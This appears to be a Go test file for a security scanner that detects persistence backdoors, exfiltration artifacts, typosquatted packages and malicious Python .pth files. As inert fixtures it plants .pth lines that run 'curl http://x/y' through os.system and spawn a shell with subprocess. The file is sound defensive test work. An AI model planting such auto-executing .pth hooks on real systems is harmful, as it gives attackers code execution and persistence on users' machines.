package checker

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/apoorv-kulkarni/vigiles/internal/scanner"
)

// The host-level checks resolve their roots from the environment: HOME via
// os.UserHomeDir, TMPDIR directly, and site-packages via a python3 subprocess.
// These tests redirect all three at temp directories so the detection branches
// run against planted artifacts instead of the real machine. They mutate
// process-global state, so they must not run in parallel.

func requirePOSIX(t *testing.T) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("home and temp layout assumptions are POSIX-specific")
	}
}

// writeFileAt creates the parent directories of path and writes body to it.
func writeFileAt(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestCheckSuspiciousPersistenceFindsHomeArtifacts(t *testing.T) {
	requirePOSIX(t)

	home := t.TempDir()
	t.Setenv("HOME", home)

	writeFileAt(t, filepath.Join(home, ".config", "sysmon", "sysmon.py"), "# backdoor\n")
	writeFileAt(t, filepath.Join(home, ".config", "systemd", "user", "sysmon.service"), "[Unit]\n")

	sigs := NewHeuristicChecker().checkSuspiciousPersistence()

	found := map[string]bool{}
	for _, s := range sigs {
		found[s.ID] = true
		if s.Type != "system-heuristic" || s.Severity != "critical" {
			t.Errorf("expected a critical system-heuristic, got %+v", s)
		}
		if s.Ecosystem != "system" {
			t.Errorf("expected the system ecosystem, got %q", s.Ecosystem)
		}
	}

	for _, want := range []string{"VIGILES-TEAMPCP-BACKDOOR", "VIGILES-TEAMPCP-PERSISTENCE"} {
		if !found[want] {
			t.Errorf("expected %s, got IDs %v", want, found)
		}
	}
}

func TestCheckSuspiciousPersistenceCleanHome(t *testing.T) {
	requirePOSIX(t)

	t.Setenv("HOME", t.TempDir())

	// /tmp is always scanned and is outside this test's control, so assert only
	// that the HOME-derived checks stayed quiet.
	for _, s := range NewHeuristicChecker().checkSuspiciousPersistence() {
		if s.ID == "VIGILES-TEAMPCP-BACKDOOR" || s.ID == "VIGILES-TEAMPCP-PERSISTENCE" {
			t.Errorf("unexpected signal on a clean home: %+v", s)
		}
	}
}

func TestCheckSuspiciousPersistenceFindsExfilArtifact(t *testing.T) {
	requirePOSIX(t)

	// Create the directory before pointing TMPDIR at it, since t.TempDir
	// itself resolves TMPDIR.
	tmp := t.TempDir()
	t.Setenv("HOME", t.TempDir())
	t.Setenv("TMPDIR", tmp)

	artifact := filepath.Join(tmp, "session.key")
	writeFileAt(t, artifact, "stolen\n")

	var got []string
	for _, s := range NewHeuristicChecker().checkSuspiciousPersistence() {
		if s.ID == "VIGILES-EXFIL-ARTIFACT" && strings.Contains(s.Summary, artifact) {
			got = append(got, s.Summary)
		}
	}
	if len(got) != 1 {
		t.Fatalf("expected 1 exfil artifact signal naming %s, got %v", artifact, got)
	}
}

// stubPython3 puts a python3 on PATH that reports sitePackages as the
// site-packages location, mimicking `python3 -c "import site; ..."`.
func stubPython3(t *testing.T, sitePackages string) {
	t.Helper()
	requirePOSIX(t)

	binDir := t.TempDir()
	// PATH is reduced to binDir, so the script may only use shell builtins.
	script := "#!/bin/sh\necho '" + sitePackages + "'\n"
	if err := os.WriteFile(filepath.Join(binDir, "python3"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", binDir)
}

func TestCheckPthFilesDetectsExecutableImports(t *testing.T) {
	site := t.TempDir()

	writeFileAt(t, filepath.Join(site, "evil.pth"), "import os; os.system('curl http://x/y')\n")
	writeFileAt(t, filepath.Join(site, "benign.pth"), "import mypackage\n")
	writeFileAt(t, filepath.Join(site, "notes.txt"), "import os; os.system('ignored')\n")

	stubPython3(t, site)

	sigs := NewHeuristicChecker().checkPthFiles()
	if len(sigs) != 1 {
		t.Fatalf("expected only the malicious .pth to be flagged, got %d: %+v", len(sigs), sigs)
	}

	got := sigs[0]
	if got.ID != "VIGILES-MALICIOUS-PTH" {
		t.Errorf("unexpected ID: %s", got.ID)
	}
	if got.Type != "system-heuristic" || got.Severity != "critical" {
		t.Errorf("expected a critical system-heuristic, got %+v", got)
	}
	if got.Package != "evil.pth" {
		t.Errorf("expected the .pth filename as the package label, got %q", got.Package)
	}
	if !strings.Contains(got.Details, "os.system") {
		t.Errorf("expected the offending line in details, got %q", got.Details)
	}
}

func TestCheckPthFilesCleanSitePackages(t *testing.T) {
	site := t.TempDir()
	writeFileAt(t, filepath.Join(site, "distutils-precedence.pth"), "import os\n")

	stubPython3(t, site)

	// "import os" alone carries no suspicious marker.
	if sigs := NewHeuristicChecker().checkPthFiles(); len(sigs) != 0 {
		t.Errorf("expected no signals for benign .pth files, got %+v", sigs)
	}
}

func TestCheckPthFilesMissingSitePackagesDir(t *testing.T) {
	stubPython3(t, filepath.Join(t.TempDir(), "does-not-exist"))

	if sigs := NewHeuristicChecker().checkPthFiles(); len(sigs) != 0 {
		t.Errorf("expected no signals when site-packages is unreadable, got %+v", sigs)
	}
}

func TestCheckPthFilesWithoutPython(t *testing.T) {
	requirePOSIX(t)
	t.Setenv("PATH", t.TempDir()) // no python3 available

	if sigs := NewHeuristicChecker().checkPthFiles(); len(sigs) != 0 {
		t.Errorf("expected no signals when python3 is missing, got %+v", sigs)
	}
}

func TestHeuristicCheckerCombinesPackageAndSystemSignals(t *testing.T) {
	requirePOSIX(t)

	home := t.TempDir()
	writeFileAt(t, filepath.Join(home, ".config", "sysmon", "sysmon.py"), "# backdoor\n")
	t.Setenv("HOME", home)

	site := t.TempDir()
	writeFileAt(t, filepath.Join(site, "evil.pth"), "import subprocess; subprocess.Popen(['sh'])\n")
	stubPython3(t, site)

	sigs := NewHeuristicChecker().Check([]scanner.Package{
		{Name: "reqests", Version: "2.32.0", Ecosystem: "pip"}, // typosquat
	})

	found := map[string]bool{}
	for _, s := range sigs {
		found[s.ID] = true
	}
	for _, want := range []string{"VIGILES-TYPOSQUAT", "VIGILES-MALICIOUS-PTH", "VIGILES-TEAMPCP-BACKDOOR"} {
		if !found[want] {
			t.Errorf("expected %s in a combined scan, got %v", want, found)
		}
	}
}
